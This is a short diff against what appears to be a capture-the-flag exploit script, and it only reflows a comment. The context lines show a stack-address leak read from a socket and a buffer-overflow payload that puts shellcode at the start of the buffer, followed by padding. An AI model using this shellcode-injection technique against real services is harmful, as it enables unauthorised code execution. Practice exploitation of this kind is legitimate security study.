@@ -190,7 +190,8 @@ leakVariable = int(s.recvline(b"]").strip(b"]\n"), 16)
 
 log.info(f"leak address of variable: {hex(leakVariable)}")
 
-# shellcode were put in the first or in the beginning of the payload, because we will fill the buffer where shellcode will be stored in variable buf (first variable in function repair)
+# shellcode were put in the first or in the beginning of the payload, because we will fill the buffer
+# where shellcode will be stored in variable buf (first variable in function repair)
 # after filling the buffer, we will call the variable buf to execute the shellcode
 payload = shellcode
 payload += b"A"*(offset-len(shellcode))
@@ -236,7 +237,8 @@ leakVariable = int(s.recvline(b"]").strip(b"]\n"), 16)
 
 log.info(f"leak address of variable: {hex(leakVariable)}")
 
-# shellcode were put in the first or in the beginning of the payload, because we will fill the buffer where shellcode will be stored in variable buf (first variable in function repair)
+# shellcode were put in the first or in the beginning of the payload, because we will fill the buffer
+# where shellcode will be stored in variable buf (first variable in function repair)
 # after filling the buffer, we will call the variable buf to execute the shellcode
 payload = shellcode
 payload += b"A"*(offset-len(shellcode))
